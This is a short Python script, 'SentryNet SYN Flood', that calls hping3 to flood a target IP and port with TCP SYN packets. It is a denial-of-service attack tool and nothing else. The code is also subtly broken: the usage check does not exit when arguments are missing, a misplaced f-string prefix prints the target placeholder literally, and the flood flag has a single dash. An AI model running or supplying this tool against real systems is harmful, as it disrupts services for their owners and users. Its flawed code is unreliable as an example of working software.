#!/usr/bin/env python3

import subprocess
import sys

def main():
	if len(sys.argv)!=3:
		print("Usage: python3 syn_flood.py <target_ip> <port>")
		print("Example: python3 syn_flood.py 10.0.0.2 80")

	target_ip=sys.argv[1]
	port=sys.argv[2]
	print("=========================================")
	print("           SentryNet SYN Flood")
	print("=========================================")
	print("f[INFO] Target: {target_ip}:{port}")
	print("[INFO] Press Ctrl+C to stop the attck.")
	try:
		subprocess.run([
			"hping3",
			"-S",
			"-flood",
			"-p",
			port,
			target_ip
		])
	except KeyboardInterrupt:
		print("\n[INFO] SYN FLOOD stopped.")

if __name__=="__main__":
	main()
